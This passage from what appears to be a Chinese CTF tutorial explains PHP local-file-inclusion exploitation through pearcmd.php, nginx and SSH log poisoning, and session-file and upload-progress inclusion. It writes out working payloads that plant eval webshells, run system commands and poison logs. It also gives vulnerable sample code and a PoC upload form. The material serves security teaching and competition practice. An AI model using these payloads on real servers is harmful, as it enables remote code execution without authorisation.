神的文章就行：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZG9ja2VyLXBocC1pbmNsdWRlLWdldHNoZWxsLmh0bWw=">Docker PHP 裸文件本地包含综述</span></p><p>或者这位佬的文章也行：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjY3NzI3MjU/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NTAuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RVJhdGUtMS0xMjY3NzI3MjUtYmxvZy0xMjEwNDIyOTAuMjM1JTVFdjM4JTVFcGNfcmVsZXZhbnRfYW50aV90M19iYXNlJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VSYXRlLTEtMTI2NzcyNzI1LWJsb2ctMTIxMDQyMjkwLjIzNSU1RXYzOCU1RXBjX3JlbGV2YW50X2FudGlfdDNfYmFzZSZhbXA7dXRtX3JlbGV2YW50X2luZGV4PTI=">利用 pearcmd.php 文件包含拿 shell（LFI）</span></p><p>然后说一下它的利用条件：</p><h4 id="利用条件"><a class="anchor" href="#利用条件">#</a> 利用条件</h4><blockquote><p>1. 安装了 pear 扩展（pear 就是一个 php 扩展及应用的代码仓库，没有安装 pear 扩展的话就没有 pear.php 文件可以利用了，pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 <code>--with-pear</code> 才会安装。）</p><p>2. 知道 pearcmd.php 文件的路径（默认路径是 /usr/local/lib/php/pearcmd.php）</p><p>3. 开启了 register_argc_argv 选项（只有开启了，$_SERVER [‘argv’] 才会生效。）</p><p>4. 有包含点，并且能包含 php 后缀的文件，而且没有 open_basedir 的限制。</p></blockquote><p>我直接拿我之前做过的一道题目举例吧：</p><p>这是题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        </pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        </pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token comment"># Something in phpinfo.php!</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>题目过滤了常见的伪协议，然后提示说在 phpinfo.php 文件中有东西？file=phpinfo 看到一串敏感信息： fake</p><p>然后检查 register_argc_argv 发现都是 on。 结合标题，pear 很明显是 pear 裸文件包含。</p><p>payload:</p><blockquote><p>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/cmd.php</p></blockquote><p>简单解释一下： 首先得知道 $_SERVER ['argv'] 通过 query_string 取值，并通过 + 作为分割符， 然后就是 config-create，阅读其代码和帮助，可以知道，它可以直接创建配置文件，这个命令需要传入两个参数，且第一个参数必须以 / 开头，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 这里的：/&amp;file=/usr/local/lib/php/pearcmd&amp;/ 就是第一个参数，由于 php 会将格式错误的代码忽视，所以这句话即起到将 /usr/local/lib/php/pearcmd 包含的作用，又写入了一句话木马文件的内容， 所以也可以这样写：</p><blockquote><p>?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/cmd.php</p></blockquote><p>最后：</p><blockquote><p>?file=/tmp/cmd</p><p>#post</p><p>0=system (&quot;cat /flag&quot;); 即可。</p></blockquote><h3 id="日志文件包含"><a class="anchor" href="#日志文件包含">#</a> 日志文件包含</h3><p>一般来说，这种文件包含形式可以细分为两种 —— 中间件日志包含和 ssh 日志包含</p><h4 id="中间件日志文件包含"><a class="anchor" href="#中间件日志文件包含">#</a> 中间件日志文件包含</h4><blockquote><p>利用条件：</p><ul><li>web 中间件日志文件的存储位置已知，并且具有可读权限</li></ul></blockquote><p>这个所谓的中间件，在平常的比赛中通常是 apache,nginx 服务器，当然</p><blockquote><p>中间件可以是任何类型的软件，例如：</p><ul><li>消息队列系统（如 RabbitMQ、Apache Kafka）：允许应用程序异步交换数据和指令。</li><li>Web 服务器（如 Apache, Nginx）：处理 HTTP 请求，并将它们路由到后台应用程序。</li><li>数据库中间件：允许不同的数据库系统之间或应用程序与数据库之间的通信。</li><li>应用服务器（如 Tomcat, WebLogic）：提供运行环境来部署、运行和管理 Web 应用程序。</li><li>API 网关：管理微服务或服务导向架构中的 API 调用。</li></ul></blockquote><p>这种文件包含首先你得知道日志文件的路径，所以可以拿上面给的敏感路径试试，实在不知道可以通过先包含配置文件来确定日志文件路径：</p><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre>/etc/init.d/httpd</pre></td></tr><tr><td data-num="2"></td><td><pre>/etc/httpd/conf/httpd.conf</pre></td></tr></table></figure><p>说再多都不如实战：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//WEB 手要懂得搜索</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>过滤了很多，伪协议近乎全军覆没，但是没有关系，我们可以使用日志包含。</p><p>发送请求 GET /?file=/var/log/nginx/access.log HTTP/1.1 发现回显出的结果存在 User-Agent 的内容，所以可在在这里进行命令执行。 由于 include 会把文件当成 php 文件执行，所以我们可以这样写：</p><figure class="highlight apl"><figcaption data-lang="APL"></figcaption><table><tr><td data-num="1"></td><td><pre>GET <span class="token monadic-operator operator">/</span><span class="token function">?</span>file<span class="token function">=</span><span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>log<span class="token monadic-operator operator">/</span>nginx<span class="token monadic-operator operator">/</span>access<span class="token dyadic-operator operator">.</span>log HTTP<span class="token monadic-operator operator">/</span><span class="token number">1.1</span> Host<span class="token dfn builtin">:</span> node5<span class="token dyadic-operator operator">.</span>anna<span class="token dyadic-operator operator">.</span>nssctf<span class="token dyadic-operator operator">.</span>cn<span class="token dfn builtin">:</span><span class="token number">28449</span> Upgrade<span class="token function">-</span>Insecure<span class="token function">-</span>Requests<span class="token dfn builtin">:</span> <span class="token number">1</span> User<span class="token function">-</span>Agent<span class="token dfn builtin">:</span>  Accept<span class="token dfn builtin">:</span> text<span class="token monadic-operator operator">/</span>html<span class="token function">,</span>application<span class="token monadic-operator operator">/</span>xhtml<span class="token function">+</span>xml<span class="token function">,</span>application<span class="token monadic-operator operator">/</span>xml<span class="token punctuation">;</span>q<span class="token function">=</span><span class="token number">0.9</span><span class="token function">,</span>image<span class="token monadic-operator operator">/</span>avif<span class="token function">,</span>image<span class="token monadic-operator operator">/</span>webp<span class="token function">,</span>image<span class="token monadic-operator operator">/</span>apng<span class="token function">,</span><span class="token function">*</span><span class="token monadic-operator operator">/</span><span class="token function">*</span><span class="token punctuation">;</span>q<span class="token function">=</span><span class="token number">0.8</span><span class="token function">,</span>application<span class="token monadic-operator operator">/</span>signed<span class="token function">-</span>exchange<span class="token punctuation">;</span>v<span class="token function">=</span>b3<span class="token punctuation">;</span>q<span class="token function">=</span><span class="token number">0.7</span> Accept<span class="token function">-</span>Encoding<span class="token dfn builtin">:</span> gzip<span class="token function">,</span> deflate Accept<span class="token function">-</span>Language<span class="token dfn builtin">:</span> zh<span class="token function">-</span>CN<span class="token function">,</span>zh<span class="token punctuation">;</span>q<span class="token function">=</span><span class="token number">0.9</span></pre></td></tr></table></figure><p>这里 system 中不能用双引号，否则会和 index 文件中的 include 函数中的双引号起冲突。</p><h4 id="ssh日志文件包含"><a class="anchor" href="#ssh日志文件包含">#</a> ssh 日志文件包含</h4><blockquote><p>SSH 日志文件包含的利用条件是：</p><ul><li>SSH 日志路径已知，并且具有可读权限</li></ul></blockquote><p>SSH 如果开启了日志记录的功能，那么会将 ssh 的连接日志记录到 ssh 日志文件当中<br>将连接的用户名设置成恶意代码，用命令连接服务器 192.168.1.1 的 ssh 服务</p><p><code>ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1</code><br>查看日志文件 /var/log/auth.log，可以观察到恶意代码已经写入到日志文件</p><p>测试输入语句： <code>http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</code><br>之后再向网页传入 POST 参数： <code>123=phpinfo</code><br>就可以出现 phpinfo 的内容了</p><h3 id="session文件包含"><a class="anchor" href="#session文件包含">#</a> session 文件包含</h3><p>当可以获取 session 文件路径并且 session 文件的内容可控的的时候，就可以通过包含 session 文件进行攻击</p><h4 id="利用条件-2"><a class="anchor" href="#利用条件-2">#</a> 利用条件</h4><blockquote><p>session 文件包含的利用条件有两个：</p><ul><li>Session 的存储位置可以获取</li><li>Session 的内容可控</li></ul></blockquote><p>一般通过以下两种方式获取 session 的存储位置：</p><blockquote><ul><li>通过 phpinfo 的信息获取 session 的存储位置。<br>通过 phpinfo 的信息获取 <code>session.save_path</code></li><li>通过猜测默认的 session 存储位置进行尝试<br>通常 Linux 中的 Session 的默认存储位置在</li><li>/var/lib/php/sess_PHPSESSID</li><li>/var/lib/php/sessions/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ul></blockquote><p>session 文件包含代码如下</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span></pre></td></tr></table></figure><p>此代码可以通过 GET 型的 ctfs 参数传入。PHP 代码将会获取的值存入到 Session 中。<br>攻击者可以利用 ctfs 参数将恶意代码写入到 session 文件中，然后在利用文件包含漏洞包含此 session 文件，向系统中传递恶意代码。</p><p>session 文件名的构造是 sess_ + sessionid ， sessionid 在 cookie 中可以查看</p><p>漏洞分析</p><p>上面的代码满足 Session 文件包含的两个要求</p><blockquote><ul><li>PHP 代码将会获取 ctfs 变量的值存入到 session 中</li><li>Session 的默认 存储位置是 /var/lib/php/session</li></ul></blockquote><p>访问 URL： <code>http://www.abc.com/xxx/session.php?ctfs=a</code> 会在 /var/lib/php/session 目录下降 ctfs 传入的值存储到 session 中<br>Session 的文件名以 sess_开头，后跟 Sessionid，Sessionid 可以通过开发者模式获取：<br>单击右键 —— 检查 —— 存储 ——Cookie——PHPSESSID 就可以找到内容</p><p>假设通过开发者模式获取到的 sessionid 的值为 hufh7hsdf392eurh4, 所以 session 的文件名为 <code>sess_hufh7hsdf392eurh4</code><br>在 /var/lib/php/session 目录下查看此文件，内容为：username|s:4:&quot;a&quot;</p><p>漏洞利用</p><p>通过上面的分析，可以得知，向 ctfs 参数传入的内容会存储到 session 文件中。<br>如果存在本地文件包含漏洞，就可以通过 ctfs 写入恶意代码到 Session 文件当中去，然后通过文件包含漏洞执行 getshell</p><p>例如：访问代码 <code>http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;</code> 后，会在 /var/lib/php/session 目录下降 ctfs 的值写入 session 文件<br>session 文件的内容为： <code>username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;</code> .</p><p>此时通过本地文件包含漏洞可以解析 session 文件达到攻击的目的</p><p>比如： <code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p><p>有时候题目并不会出现</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span></pre></td></tr></table></figure><p>也就是说并不会启用 session，这时候我们就可以利用 SESSION_UPLOAD_PROGRESS</p><p>首先先了解</p><h4 id="与-session-有关的几个-php-选项"><a class="anchor" href="#与-session-有关的几个-php-选项">#</a> 与 SESSION 有关的几个 PHP 选项</h4><p><code>session.auto_start</code> ：如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是默认关闭的。</p><p><code>session.upload_progress.cleanup = on</code> ：表示当文件上传结束后，php 将会立即清空对应 session 文件中的内容。该选项默认开启</p><p><code>session.use_strict_mode</code> ：默认情况下，该选项的值是 0，此时用户可以自己定义 Session ID。</p><p><code>session Upload Progress</code></p><p>Session Upload Progress 即 Session 上传进度，是 php&gt;=5.4 后开始添加的一个特性。官网对他的描述是当 <code>session.upload_progress.enabled</code> 选项开启时（默认开启），PHP 能够在每一个文件上传时 监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个 POST 请求到终端（例如通过 XHR）来检查这个状态。</p><p>当一个上传在处理中，同时 POST 一个与 INI 中设置的 session.upload_progress.name 同名变量时，上传进度可以在 SESSION 中获得。当 PHP 检测到这种 POST 请求时，它会在_SESSION 中添加一组数据，索引是 session.upload_progress.prefix 与 session.upload_progress.name 连接在一起的值。</p><p>下面给出一个 php 官方文档的一个进度数组的结构的样例：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"upload.php"</span> method<span class="token operator">=</span><span class="token string">"POST"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"&lt;?php echo ini_get("</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>name<span class="token string">"); ?>"</span> value<span class="token operator">=</span><span class="token string">"123"</span> <span class="token operator">/</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"file1"</span> <span class="token operator">/</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"file2"</span> <span class="token operator">/</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span></pre></td></tr></table></figure><p>此时在 session 中存放的数据看上去是这样子的：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre>$_SESSION<span class="token punctuation">[</span><span class="token string">"upload_progress_123"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span>    <span class="token comment">// 其中存在上面表单里的 value 值 "123"</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token string">"start_time"</span> <span class="token operator">=></span> <span class="token number">1234567890</span><span class="token punctuation">,</span>   <span class="token comment">// The request time 请求时间</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token string">"content_length"</span> <span class="token operator">=></span> <span class="token number">57343257</span><span class="token punctuation">,</span> <span class="token comment">// POST content length  post 数据长度</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token string">"bytes_processed"</span> <span class="token operator">=></span> <span class="token number">453489</span><span class="token punctuation">,</span>  <span class="token comment">// Amount of bytes received and processed  已接收的字节数量</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token string">"done"</span> <span class="token operator">=></span> <span class="token boolean">false</span><span class="token punctuation">,</span>              <span class="token comment">// true when the POST handler has finished, successfully or not</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token string">"files"</span> <span class="token operator">=></span> <span class="token function">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token number">0</span> <span class="token operator">=></span> <span class="token function">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token string">"field_name"</span> <span class="token operator">=></span> <span class="token string">"file1"</span><span class="token punctuation">,</span>       <span class="token comment">// Name of the &lt;input/> field  上传区域</span></pre></td></tr><tr><td data-num="10"></td><td><pre>   <span class="token comment">// The following 3 elements equals those in $_FILES</span></pre></td></tr><tr><td data-num="11"></td><td><pre>   <span class="token string">"name"</span> <span class="token operator">=></span> <span class="token string">"foo.avi"</span><span class="token punctuation">,</span>     <span class="token comment">// 上传文件名</span></pre></td></tr><tr><td data-num="12"></td><td><pre>   <span class="token string">"tmp_name"</span> <span class="token operator">=></span> <span class="token string">"/tmp/phpxxxxxx"</span><span class="token punctuation">,</span>     <span class="token comment">// 上传后在服务端的临时文件名</span></pre></td></tr><tr><td data-num="13"></td><td><pre>   <span class="token string">"error"</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>   <span class="token string">"done"</span> <span class="token operator">=></span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token comment">// True when the POST handler has finished handling this file</span></pre></td></tr><tr><td data-num="15"></td><td><pre>   <span class="token string">"start_time"</span> <span class="token operator">=></span> <span class="token number">1234567890</span><span class="token punctuation">,</span>    <span class="token comment">// When this file has started to be processed</span></pre></td></tr><tr><td data-num="16"></td><td><pre>   <span class="token string">"bytes_processed"</span> <span class="token operator">=></span> <span class="token number">57343250</span><span class="token punctuation">,</span> <span class="token comment">// Amount of bytes received and processed for this file</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token comment">// An other file, not finished uploading, in the same request</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token number">1</span> <span class="token operator">=></span> <span class="token function">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="20"></td><td><pre>   <span class="token string">"field_name"</span> <span class="token operator">=></span> <span class="token string">"file2"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>   <span class="token string">"name"</span> <span class="token operator">=></span> <span class="token string">"bar.avi"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>   <span class="token string">"tmp_name"</span> <span class="token operator">=></span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>   <span class="token string">"error"</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>   <span class="token string">"done"</span> <span class="token operator">=></span> <span class="token boolean">false</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>   <span class="token string">"start_time"</span> <span class="token operator">=></span> <span class="token number">1234567899</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>   <span class="token string">"bytes_processed"</span> <span class="token operator">=></span> <span class="token number">54554</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h4 id="利用-session-upload-progress-上传-session"><a class="anchor" href="#利用-session-upload-progress-上传-session">#</a> 利用 Session Upload Progress 上传 Session</h4><p>Session Upload Progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中，此时即使用户没有初始化 Session，PHP 也会自动初始化 Session。而且，默认情况下 session.upload_progress.enabled 是为 On 的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化 Session。</p><p>从上面官方的案例和结果中可以看到，session 中一部分数据（session.upload_progress.name）是用户自己可以控制的。那么我们只要在上传文件的时候，同时 POST 一个恶意的字段 <code>PHP_SESSION_UPLOAD_PROGRESS</code> ，目标服务器的 PHP 就会自动启用 Session，Session 文件将会自动创建。</p><p>我们怎么将 session 传过去呢？这里我们需要在本地构造一个上传和 POST 同时进行的情况，接下来我们构造一个上传表单，把下面代码保存为</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.43.82/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>本地访问 poc.html，然后随便上传个文件后抓包，在 HTTP 头中加上一个 <code>Cookie: PHPSESSID</code> ：</p><p>成功在目标主机上初始化了一个随机命名的 Session</p><h4 id="利用-session-upload-progress-来-getshell"><a class="anchor" href="#利用-session-upload-progress-来-getshell">#</a> 利用 Session Upload Progress 来 Getshell</h4><p>在上面的实验中我们成功利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> ，目标服务器上自动创建了一个 Session 文件。如果此时目标网站还存在文件包含漏洞的话，我们便可以配合文件包含漏洞来 Getshell。其原理大致就是通过 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 在目标主机上创建一个含有恶意代码的 Session 文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个 Session 